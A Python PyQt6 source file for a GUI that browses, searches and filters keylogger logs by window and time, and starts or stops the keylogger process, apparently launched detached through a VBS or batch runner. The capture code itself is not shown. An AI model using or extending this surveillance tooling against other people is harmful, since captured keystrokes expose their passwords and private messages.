"""
Log Viewer — PyQt6 GUI
======================
Desktop application to browse keylogger logs, search across all files,
filter by window/program and time, and manage the keylogger process.
"""

import ctypes
import ctypes.wintypes
import csv
import io
import os
import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt6.QtGui import QColor, QFont, QIcon, QTextCharFormat, QSyntaxHighlighter
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QStackedWidget, QPushButton, QLabel, QListWidget, QListWidgetItem,
    QLineEdit, QPlainTextEdit, QSplitter, QMessageBox, QComboBox,
    QGroupBox, QGridLayout, QFrame, QSizePolicy, QStatusBar,
)

# ── Paths ─────────────────────────────────────────────────────────────────────

BASE_DIR = Path(__file__).parent
LOGS_DIR = BASE_DIR / "logs"
PID_FILE = BASE_DIR / "keylogger.pid"
MAIN_SCRIPT = str(BASE_DIR / "main.py")

# ── Log parsing ───────────────────────────────────────────────────────────────

_LOG_RE = re.compile(r"^\[(\d{2}:\d{2}:\d{2})\]\s+\[(.+?)\]\s+(.+)$")


def parse_log_line(line):
    m = _LOG_RE.match(line)
    if m:
        return m.group(1), m.group(2), m.group(3)
    return None


def get_log_dates():
    if not LOGS_DIR.exists():
        return []
    dates = []
    for f in sorted(LOGS_DIR.glob("*.log"), reverse=True):
        name = f.stem
        try:
            datetime.strptime(name, "%Y-%m-%d")
        except ValueError:
            continue
        try:
            count = sum(1 for _ in open(f, encoding="utf-8", errors="replace"))
            size = f.stat().st_size
        except Exception:
            count, size = 0, 0
        dates.append((name, f, count, size))
    return dates


def read_log_file(path):
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return [line.rstrip("\n") for line in f]
    except Exception as e:
        return [f"[Error reading log: {e}]"]


def search_all_logs(query):
    results = []
    if not query or not LOGS_DIR.exists():
        return results
    q = query.lower()
    for f in sorted(LOGS_DIR.glob("*.log"), reverse=True):
        name = f.stem
        try:
            datetime.strptime(name, "%Y-%m-%d")
        except ValueError:
            continue
        try:
            with open(f, encoding="utf-8", errors="replace") as fh:
                for i, line in enumerate(fh, 1):
                    if q in line.lower():
                        results.append((name, i, line.rstrip("\n")))
        except Exception:
            continue
    return results


def extract_windows_all_logs():
    windows = {}
    if not LOGS_DIR.exists():
        return []
    for f in sorted(LOGS_DIR.glob("*.log")):
        name = f.stem
        try:
            datetime.strptime(name, "%Y-%m-%d")
        except ValueError:
            continue
        try:
            with open(f, encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    p = parse_log_line(line.rstrip("\n"))
                    if p:
                        win = p[1]
                        if win not in windows:
                            windows[win] = {"count": 0, "dates": set()}
                        windows[win]["count"] += 1
                        windows[win]["dates"].add(name)
        except Exception:
            continue
    result = [(w, d["count"], sorted(d["dates"])) for w, d in windows.items()]
    result.sort(key=lambda x: x[1], reverse=True)
    return result


# ── Process management ────────────────────────────────────────────────────────

def is_keylogger_running():
    if not PID_FILE.exists():
        return False
    try:
        pid = int(PID_FILE.read_text(encoding="utf-8").strip())
        kernel32 = ctypes.windll.kernel32
        kernel32.OpenProcess.restype = ctypes.wintypes.HANDLE
        kernel32.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
        handle = kernel32.OpenProcess(0x1000, False, pid)
        if handle:
            kernel32.CloseHandle(handle)
            return True
        return False
    except (ValueError, OSError):
        return False


def _ps_query():
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NoLogo", "-Command",
         "Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" "
         "| Select-Object ProcessId,ExecutablePath,CommandLine "
         "| ConvertTo-Csv -NoTypeInformation"],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        return []
    found = []
    base_lower = str(BASE_DIR).lower()
    main_lower = MAIN_SCRIPT.lower()
    my_pid = str(os.getpid())
    for row in csv.DictReader(io.StringIO(result.stdout)):
        pid = row.get("ProcessId", "")
        exe = row.get("ExecutablePath", "") or ""
        cmd = row.get("CommandLine", "") or ""
        if pid == my_pid:
            continue
        cmd_lower = cmd.lower().rstrip()
        if main_lower in cmd_lower or (base_lower in exe.lower() and cmd_lower.endswith("main.py")):
            found.append((pid, exe or "unknown", cmd or "unknown"))
    return found


def stop_keylogger():
    main_escaped = MAIN_SCRIPT.replace("'", "''").lower()
    base_escaped = str(BASE_DIR).replace("'", "''").lower()
    my_pid = os.getpid()
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NoLogo", "-Command",
         f"$p = Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" "
         f"| Where-Object {{ $_.ProcessId -ne {my_pid} -and $_.CommandLine -and "
         f"($_.CommandLine.ToLower().Contains('{main_escaped}') -or "
         f"($_.ExecutablePath -and $_.ExecutablePath.ToLower().Contains('{base_escaped}') -and "
         f"$_.CommandLine.TrimEnd().ToLower().EndsWith('main.py'))) }}; "
         f"if ($p) {{ $p | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force }}; "
         f"($p | ForEach-Object {{ $_.ProcessId }}) -join ',' }} "
         f"else {{ 'NONE' }}"],
        capture_output=True, text=True,
    )
    PID_FILE.unlink(missing_ok=True)
    output = result.stdout.strip()
    if not output or output == "NONE":
        return "Keylogger is not running."
    pids = [p.strip() for p in output.split(",") if p.strip()]
    return f"Stopped {len(pids)} process(es): PID {', '.join(pids)}"


def start_keylogger():
    runner = BASE_DIR / "runner.bat"
    vbs = BASE_DIR / "KL-RUNNER.vbs"
    if vbs.exists():
        subprocess.Popen(["wscript", str(vbs)], cwd=str(BASE_DIR))
    elif runner.exists():
        subprocess.Popen(["cmd", "/c", str(runner)], cwd=str(BASE_DIR),
                         creationflags=0x00000008)
    else:
        venv_py = BASE_DIR / "venv" / "Scripts" / "python.exe"
        py = str(venv_py) if venv_py.exists() else "python"
        subprocess.Popen([py, str(BASE_DIR / "main.py")], cwd=str(BASE_DIR),
                         creationflags=0x00000008)


# ── Background workers ────────────────────────────────────────────────────────

class SearchWorker(QThread):
    finished = pyqtSignal(list)

    def __init__(self, query):
        super().__init__()
        self.query = query

    def run(self):
        self.finished.emit(search_all_logs(self.query))


class WindowScanWorker(QThread):
    finished = pyqtSignal(list)

    def run(self):
        self.finished.emit(extract_windows_all_logs())


class StatusWorker(QThread):
    finished = pyqtSignal(list)

    def run(self):
        try:
            self.finished.emit(_ps_query())
        except Exception:
            self.finished.emit([])


# ── Style ─────────────────────────────────────────────────────────────────────

DARK_STYLE = """
QMainWindow, QWidget { background-color: #1e1e2e; color: #cdd6f4; }
QLabel { color: #cdd6f4; }
QGroupBox { border: 1px solid #45475a; border-radius: 6px; margin-top: 12px;
            padding-top: 14px; font-weight: bold; color: #89b4fa; }
QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 6px; }
QListWidget { background-color: #181825; border: 1px solid #45475a; border-radius: 4px;
              color: #cdd6f4; outline: none; }
QListWidget::item { padding: 6px 10px; border-bottom: 1px solid #313244; }
QListWidget::item:selected { background-color: #45475a; color: #cdd6f4; }
QListWidget::item:hover { background-color: #313244; }
QPlainTextEdit { background-color: #181825; border: 1px solid #45475a; border-radius: 4px;
                 color: #cdd6f4; selection-background-color: #45475a; }
QLineEdit { background-color: #181825; border: 1px solid #45475a; border-radius: 4px;
            padding: 6px 10px; color: #cdd6f4; }
QLineEdit:focus { border-color: #89b4fa; }
QComboBox { background-color: #181825; border: 1px solid #45475a; border-radius: 4px;
            padding: 4px 10px; color: #cdd6f4; }
QComboBox::drop-down { border: none; }
QComboBox QAbstractItemView { background-color: #181825; color: #cdd6f4;
                               selection-background-color: #45475a; }
QPushButton { background-color: #313244; border: 1px solid #45475a; border-radius: 4px;
              padding: 6px 16px; color: #cdd6f4; font-weight: bold; }
QPushButton:hover { background-color: #45475a; }
QPushButton:pressed { background-color: #585b70; }
QPushButton#startBtn { background-color: #1a5c2e; border-color: #a6e3a1; color: #a6e3a1; }
QPushButton#startBtn:hover { background-color: #246b38; }
QPushButton#stopBtn { background-color: #5c1a1a; border-color: #f38ba8; color: #f38ba8; }
QPushButton#stopBtn:hover { background-color: #6b2424; }
QPushButton#navBtn { background-color: transparent; border: none; text-align: left;
                     padding: 10px 16px; font-size: 13px; }
QPushButton#navBtn:hover { background-color: #313244; }
QPushButton#navBtn:checked { background-color: #45475a; color: #89b4fa; }
QSplitter::handle { background-color: #45475a; }
QStatusBar { background-color: #181825; color: #6c7086; border-top: 1px solid #313244; }
QFrame#separator { background-color: #45475a; }
"""

C_SHORTCUT = "#89b4fa"
C_ENTER = "#a6e3a1"
C_KEYSTROKE = "#cdd6f4"
C_ERROR = "#f38ba8"
C_OTHER = "#6c7086"
C_TIME = "#f9e2af"
C_WINDOW = "#cba6f7"


# ── Log syntax highlighter ────────────────────────────────────────────────────

class LogHighlighter(QSyntaxHighlighter):
    def highlightBlock(self, text):
        p = parse_log_line(text)
        if not p:
            fmt = QTextCharFormat()
            fmt.setForeground(QColor(C_OTHER))
            self.setFormat(0, len(text), fmt)
            return
        t, w, entry = p
        # timestamp
        ts_end = text.index("]") + 1
        fmt_ts = QTextCharFormat()
        fmt_ts.setForeground(QColor(C_TIME))
        self.setFormat(0, ts_end, fmt_ts)
        # window
        w_start = text.index("[", ts_end)
        w_end = text.index("]", w_start) + 1
        fmt_w = QTextCharFormat()
        fmt_w.setForeground(QColor(C_WINDOW))
        self.setFormat(w_start, w_end - w_start, fmt_w)
        # entry
        e_start = w_end + 1
        fmt_e = QTextCharFormat()
        if "Shortcut:" in entry:
            fmt_e.setForeground(QColor(C_SHORTCUT))
        elif "Enter key" in entry:
            fmt_e.setForeground(QColor(C_ENTER))
        elif "Keystroke:" in entry:
            fmt_e.setForeground(QColor(C_KEYSTROKE))
        elif "[Error]" in entry:
            fmt_e.setForeground(QColor(C_ERROR))
        else:
            fmt_e.setForeground(QColor(C_OTHER))
        self.setFormat(e_start, len(text) - e_start, fmt_e)


# ── Pages ─────────────────────────────────────────────────────────────────────

class DashboardPage(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win
        lay = QVBoxLayout(self)
        lay.setContentsMargins(20, 20, 20, 20)
        lay.setSpacing(16)

        # today's summary
        self.today_group = QGroupBox("Today's Summary")
        tg = QGridLayout(self.today_group)
        self.lbl_date = QLabel()
        self.lbl_entries = QLabel()
        self.lbl_windows = QLabel()
        self.lbl_size = QLabel()
        for i, (label, widget) in enumerate([
            ("Date:", self.lbl_date), ("Entries:", self.lbl_entries),
            ("Windows:", self.lbl_windows), ("Log size:", self.lbl_size),
        ]):
            lbl = QLabel(label)
            lbl.setStyleSheet("color: #6c7086; font-weight: bold;")
            tg.addWidget(lbl, i, 0)
            tg.addWidget(widget, i, 1)
        tg.setColumnStretch(1, 1)
        lay.addWidget(self.today_group)

        # all logs summary
        self.all_group = QGroupBox("All Logs")
        ag = QGridLayout(self.all_group)
        self.lbl_total_files = QLabel()
        self.lbl_total_entries = QLabel()
        self.lbl_date_range = QLabel()
        for i, (label, widget) in enumerate([
            ("Total files:", self.lbl_total_files),
            ("Total entries:", self.lbl_total_entries),
            ("Date range:", self.lbl_date_range),
        ]):
            lbl = QLabel(label)
            lbl.setStyleSheet("color: #6c7086; font-weight: bold;")
            ag.addWidget(lbl, i, 0)
            ag.addWidget(widget, i, 1)
        ag.setColumnStretch(1, 1)
        lay.addWidget(self.all_group)

        lay.addStretch()

    def refresh(self):
        dates = get_log_dates()
        today = datetime.now().strftime("%Y-%m-%d")
        today_entry = next((d for d in dates if d[0] == today), None)

        self.lbl_date.setText(datetime.now().strftime("%A, %B %d, %Y"))
        if today_entry:
            self.lbl_entries.setText(f"{today_entry[2]:,}")
            self.lbl_size.setText(_fmt_size(today_entry[3]))
            lines = read_log_file(today_entry[1])
            wins = set()
            for l in lines:
                p = parse_log_line(l)
                if p:
                    wins.add(p[1])
            self.lbl_windows.setText(str(len(wins)))
        else:
            self.lbl_entries.setText("0")
            self.lbl_size.setText("—")
            self.lbl_windows.setText("0")

        total_entries = sum(d[2] for d in dates)
        self.lbl_total_files.setText(str(len(dates)))
        self.lbl_total_entries.setText(f"{total_entries:,}")
        if dates:
            oldest = dates[-1][0]
            newest = dates[0][0]
            self.lbl_date_range.setText(f"{oldest}  to  {newest}")
        else:
            self.lbl_date_range.setText("—")


class LogsPage(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win

        splitter = QSplitter(Qt.Orientation.Horizontal)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.addWidget(splitter)

        # left panel — date list
        left = QWidget()
        left_lay = QVBoxLayout(left)
        left_lay.setContentsMargins(10, 10, 5, 10)
        left_lay.addWidget(QLabel("Log Files"))
        self.date_list = QListWidget()
        self.date_list.currentRowChanged.connect(self._on_date_selected)
        left_lay.addWidget(self.date_list)

        btn_row = QHBoxLayout()
        self.btn_delete = QPushButton("Delete")
        self.btn_delete.clicked.connect(self._on_delete)
        btn_row.addWidget(self.btn_delete)
        btn_row.addStretch()
        left_lay.addLayout(btn_row)
        splitter.addWidget(left)

        # right panel — log viewer
        right = QWidget()
        right_lay = QVBoxLayout(right)
        right_lay.setContentsMargins(5, 10, 10, 10)

        # filters row
        filt_lay = QHBoxLayout()
        self.txt_filter = QLineEdit()
        self.txt_filter.setPlaceholderText("Filter text...")
        self.txt_filter.textChanged.connect(self._apply_filters)
        filt_lay.addWidget(self.txt_filter)

        self.cmb_window = QComboBox()
        self.cmb_window.setMinimumWidth(180)
        self.cmb_window.currentIndexChanged.connect(self._apply_filters)
        filt_lay.addWidget(self.cmb_window)

        self.txt_time_from = QLineEdit()
        self.txt_time_from.setPlaceholderText("From HH:MM")
        self.txt_time_from.setMaximumWidth(90)
        self.txt_time_from.textChanged.connect(self._apply_filters)
        filt_lay.addWidget(self.txt_time_from)

        self.txt_time_to = QLineEdit()
        self.txt_time_to.setPlaceholderText("To HH:MM")
        self.txt_time_to.setMaximumWidth(90)
        self.txt_time_to.textChanged.connect(self._apply_filters)
        filt_lay.addWidget(self.txt_time_to)

        self.btn_clear = QPushButton("Clear")
        self.btn_clear.clicked.connect(self._clear_filters)
        filt_lay.addWidget(self.btn_clear)
        right_lay.addLayout(filt_lay)

        # log display
        self.log_view = QPlainTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setFont(QFont("Consolas", 10))
        self.log_view.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        self._highlighter = LogHighlighter(self.log_view.document())
        right_lay.addWidget(self.log_view)

        self.lbl_stats = QLabel()
        self.lbl_stats.setStyleSheet("color: #6c7086;")
        right_lay.addWidget(self.lbl_stats)

        splitter.addWidget(right)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)

        self._dates = []
        self._current_lines = []

    def refresh(self):
        self._dates = get_log_dates()
        current_row = self.date_list.currentRow()
        self.date_list.blockSignals(True)
        self.date_list.clear()
        for name, path, count, size in self._dates:
            try:
                dt = datetime.strptime(name, "%Y-%m-%d")
                label = dt.strftime("%A, %B %d, %Y")
            except ValueError:
                label = name
            item = QListWidgetItem(f"{label}   ({count:,} entries, {_fmt_size(size)})")
            item.setData(Qt.ItemDataRole.UserRole, (name, path))
            self.date_list.addItem(item)
        if self._dates:
            row = min(current_row, len(self._dates) - 1)
            self.date_list.setCurrentRow(max(0, row))
        self.date_list.blockSignals(False)
        if self._dates:
            self._on_date_selected(self.date_list.currentRow())

    def _on_date_selected(self, row):
        if row < 0 or row >= len(self._dates):
            return
        _, path, count, size = self._dates[row]
        self._current_lines = read_log_file(path)
        # populate window filter
        self.cmb_window.blockSignals(True)
        self.cmb_window.clear()
        self.cmb_window.addItem("All windows")
        wins = {}
        for line in self._current_lines:
            p = parse_log_line(line)
            if p:
                wins[p[1]] = wins.get(p[1], 0) + 1
        for w in sorted(wins, key=wins.get, reverse=True):
            self.cmb_window.addItem(f"{w} ({wins[w]})", w)
        self.cmb_window.blockSignals(False)
        self._apply_filters()

    def _apply_filters(self):
        lines = self._current_lines
        text = self.txt_filter.text().strip().lower()
        win_data = self.cmb_window.currentData()
        t_from = self.txt_time_from.text().strip()
        t_to = self.txt_time_to.text().strip()

        filtered = []
        for line in lines:
            if text and text not in line.lower():
                continue
            p = parse_log_line(line)
            if win_data and p and p[1] != win_data:
                continue
            if (t_from or t_to) and p:
                t = p[0][:5]
                if t_from and t < t_from:
                    continue
                if t_to and t > t_to:
                    continue
            filtered.append(line)

        self.log_view.setPlainText("\n".join(filtered))
        self.lbl_stats.setText(f"Showing {len(filtered):,} of {len(self._current_lines):,} entries")

    def _clear_filters(self):
        self.txt_filter.clear()
        self.cmb_window.setCurrentIndex(0)
        self.txt_time_from.clear()
        self.txt_time_to.clear()

    def _on_delete(self):
        row = self.date_list.currentRow()
        if row < 0:
            return
        name, path, _, _ = self._dates[row]
        reply = QMessageBox.question(
            self, "Delete Log",
            f"Delete log for {name}?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply == QMessageBox.StandardButton.Yes:
            try:
                Path(path).unlink()
            except Exception:
                pass
            self.refresh()

    def jump_to(self, date_str, line_no=0):
        for i, (name, *_) in enumerate(self._dates):
            if name == date_str:
                self.date_list.setCurrentRow(i)
                if line_no > 0:
                    block = self.log_view.document().findBlockByLineNumber(line_no - 1)
                    cursor = self.log_view.textCursor()
                    cursor.setPosition(block.position())
                    self.log_view.setTextCursor(cursor)
                    self.log_view.centerCursor()
                break


class SearchPage(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win
        self._worker = None

        lay = QVBoxLayout(self)
        lay.setContentsMargins(20, 20, 20, 20)
        lay.setSpacing(12)

        lay.addWidget(QLabel("Search across all log files (case-insensitive):"))

        row = QHBoxLayout()
        self.txt_query = QLineEdit()
        self.txt_query.setPlaceholderText("Type search query...")
        self.txt_query.returnPressed.connect(self._do_search)
        row.addWidget(self.txt_query)
        btn = QPushButton("Search")
        btn.clicked.connect(self._do_search)
        row.addWidget(btn)
        lay.addLayout(row)

        self.lbl_status = QLabel()
        self.lbl_status.setStyleSheet("color: #6c7086;")
        lay.addWidget(self.lbl_status)

        self.result_list = QListWidget()
        self.result_list.itemDoubleClicked.connect(self._on_result_click)
        lay.addWidget(self.result_list)

        self._results = []

    def refresh(self):
        self.txt_query.setFocus()

    def _do_search(self):
        q = self.txt_query.text().strip()
        if not q:
            return
        self.lbl_status.setText("Searching...")
        self.result_list.clear()
        self._worker = SearchWorker(q)
        self._worker.finished.connect(self._on_results)
        self._worker.start()

    def _on_results(self, results):
        self._results = results
        self.result_list.clear()
        if not results:
            self.lbl_status.setText("No results found.")
            return
        dates_seen = set()
        file_count = len(set(r[0] for r in results))
        self.lbl_status.setText(f"{len(results):,} matches across {file_count} file(s)")
        for date_str, line_no, raw in results:
            if date_str not in dates_seen:
                dates_seen.add(date_str)
                try:
                    dt = datetime.strptime(date_str, "%Y-%m-%d")
                    label = dt.strftime("%A, %B %d, %Y")
                except ValueError:
                    label = date_str
                header = QListWidgetItem(f"── {label} ──")
                header.setFlags(Qt.ItemFlag.NoItemFlags)
                header.setForeground(QColor(C_SHORTCUT))
                font = header.font()
                font.setBold(True)
                header.setFont(font)
                self.result_list.addItem(header)
            item = QListWidgetItem(f"  {raw}")
            item.setData(Qt.ItemDataRole.UserRole, (date_str, line_no))
            p = parse_log_line(raw)
            if p:
                entry = p[2]
                if "Shortcut:" in entry:
                    item.setForeground(QColor(C_SHORTCUT))
                elif "Enter key" in entry:
                    item.setForeground(QColor(C_ENTER))
                elif "[Error]" in entry:
                    item.setForeground(QColor(C_ERROR))
            self.result_list.addItem(item)

    def _on_result_click(self, item):
        data = item.data(Qt.ItemDataRole.UserRole)
        if not data:
            return
        date_str, line_no = data
        self.main_win.nav_to_logs(date_str, line_no)

    def search_for(self, query):
        self.txt_query.setText(query)
        self._do_search()


class WindowsPage(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win
        self._worker = None
        self._data = []

        lay = QVBoxLayout(self)
        lay.setContentsMargins(20, 20, 20, 20)
        lay.setSpacing(12)

        lay.addWidget(QLabel("All windows/programs found across your logs:"))

        self.txt_filter = QLineEdit()
        self.txt_filter.setPlaceholderText("Filter windows...")
        self.txt_filter.textChanged.connect(self._apply_filter)
        lay.addWidget(self.txt_filter)

        self.lbl_status = QLabel()
        self.lbl_status.setStyleSheet("color: #6c7086;")
        lay.addWidget(self.lbl_status)

        self.win_list = QListWidget()
        self.win_list.itemDoubleClicked.connect(self._on_click)
        lay.addWidget(self.win_list)

    def refresh(self):
        self.lbl_status.setText("Scanning logs...")
        self.win_list.clear()
        self._worker = WindowScanWorker()
        self._worker.finished.connect(self._on_data)
        self._worker.start()

    def _on_data(self, data):
        self._data = data
        self._apply_filter()

    def _apply_filter(self):
        filt = self.txt_filter.text().strip().lower()
        self.win_list.clear()
        shown = 0
        for name, count, dates in self._data:
            if filt and filt not in name.lower():
                continue
            days = len(dates)
            item = QListWidgetItem(f"{name}   —   {count:,} entries ({days} day{'s' if days != 1 else ''})")
            item.setData(Qt.ItemDataRole.UserRole, name)
            self.win_list.addItem(item)
            shown += 1
        self.lbl_status.setText(f"{shown} window(s)")

    def _on_click(self, item):
        name = item.data(Qt.ItemDataRole.UserRole)
        if name:
            self.main_win.nav_to_search(name)


# ── Main Window ───────────────────────────────────────────────────────────────

def _fmt_size(b):
    if b < 1024:
        return f"{b} B"
    if b < 1024 * 1024:
        return f"{b / 1024:.1f} KB"
    return f"{b / 1024 / 1024:.1f} MB"


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keylogger — Log Viewer")
        self.resize(1000, 650)

        central = QWidget()
        self.setCentralWidget(central)
        main_lay = QHBoxLayout(central)
        main_lay.setContentsMargins(0, 0, 0, 0)
        main_lay.setSpacing(0)

        # ── sidebar ──
        sidebar = QWidget()
        sidebar.setFixedWidth(170)
        sidebar.setStyleSheet("background-color: #11111b;")
        sb_lay = QVBoxLayout(sidebar)
        sb_lay.setContentsMargins(0, 10, 0, 10)
        sb_lay.setSpacing(2)

        # status indicator
        self.status_indicator = QLabel()
        self.status_indicator.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_indicator.setStyleSheet("padding: 10px; font-weight: bold;")
        sb_lay.addWidget(self.status_indicator)

        # control buttons
        ctrl_lay = QHBoxLayout()
        ctrl_lay.setContentsMargins(10, 4, 10, 10)
        self.btn_start = QPushButton("Start")
        self.btn_start.setObjectName("startBtn")
        self.btn_start.clicked.connect(self._on_start)
        ctrl_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("Stop")
        self.btn_stop.setObjectName("stopBtn")
        self.btn_stop.clicked.connect(self._on_stop)
        ctrl_lay.addWidget(self.btn_stop)
        sb_lay.addLayout(ctrl_lay)

        sep = QFrame()
        sep.setObjectName("separator")
        sep.setFixedHeight(1)
        sb_lay.addWidget(sep)

        # nav buttons
        self.nav_btns = []
        for label, idx in [("  Home", 0), ("  Logs", 1), ("  Search", 2), ("  Windows", 3)]:
            btn = QPushButton(label)
            btn.setObjectName("navBtn")
            btn.setCheckable(True)
            btn.clicked.connect(lambda checked, i=idx: self._switch_page(i))
            sb_lay.addWidget(btn)
            self.nav_btns.append(btn)

        sb_lay.addStretch()

        # status info button
        self.btn_status = QPushButton("  Status Info")
        self.btn_status.setObjectName("navBtn")
        self.btn_status.clicked.connect(self._on_status_info)
        sb_lay.addWidget(self.btn_status)

        main_lay.addWidget(sidebar)

        # ── pages ──
        self.stack = QStackedWidget()
        self.pg_dashboard = DashboardPage(self)
        self.pg_logs = LogsPage(self)
        self.pg_search = SearchPage(self)
        self.pg_windows = WindowsPage(self)
        self.stack.addWidget(self.pg_dashboard)
        self.stack.addWidget(self.pg_logs)
        self.stack.addWidget(self.pg_search)
        self.stack.addWidget(self.pg_windows)
        main_lay.addWidget(self.stack)

        # statusbar
        self.statusBar().showMessage(f"Logs: {LOGS_DIR}")

        # timer for status refresh
        self._timer = QTimer()
        self._timer.timeout.connect(self._refresh_status)
        self._timer.start(2000)

        self._switch_page(0)
        self._refresh_status()

    def _switch_page(self, idx):
        for i, btn in enumerate(self.nav_btns):
            btn.setChecked(i == idx)
        self.stack.setCurrentIndex(idx)
        page = self.stack.currentWidget()
        page.refresh()

    def _refresh_status(self):
        running = is_keylogger_running()
        if running:
            self.status_indicator.setText("● RUNNING")
            self.status_indicator.setStyleSheet(
                "padding: 10px; font-weight: bold; color: #a6e3a1; background-color: #1a2e1a; border-radius: 6px; margin: 6px;")
        else:
            self.status_indicator.setText("○ STOPPED")
            self.status_indicator.setStyleSheet(
                "padding: 10px; font-weight: bold; color: #6c7086; background-color: #1e1e2e; border-radius: 6px; margin: 6px;")

    def _on_start(self):
        if is_keylogger_running():
            self.statusBar().showMessage("Keylogger is already running.", 3000)
            return
        start_keylogger()
        self.statusBar().showMessage("Keylogger started.", 3000)
        QTimer.singleShot(1500, self._refresh_status)

    def _on_stop(self):
        reply = QMessageBox.question(
            self, "Stop Keylogger", "Stop the keylogger?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            msg = stop_keylogger()
            self.statusBar().showMessage(msg, 5000)
            QTimer.singleShot(1000, self._refresh_status)

    def _on_status_info(self):
        try:
            procs = _ps_query()
        except Exception:
            procs = []
        if not procs:
            QMessageBox.information(self, "Status", "Keylogger is not running.")
            return
        lines = [f"Running ({len(procs)} process{'es' if len(procs) > 1 else ''}):\n"]
        for pid, exe, cmd in procs:
            lines.append(f"PID: {pid}")
            lines.append(f"Exe: {exe}")
            lines.append(f"Cmd: {cmd}\n")
        QMessageBox.information(self, "Keylogger Status", "\n".join(lines))

    def nav_to_logs(self, date_str=None, line_no=0):
        self._switch_page(1)
        if date_str:
            self.pg_logs.jump_to(date_str, line_no)

    def nav_to_search(self, query=""):
        self._switch_page(2)
        if query:
            self.pg_search.search_for(query)


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setFont(QFont("Segoe UI", 10))
    app.setStyleSheet(DARK_STYLE)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
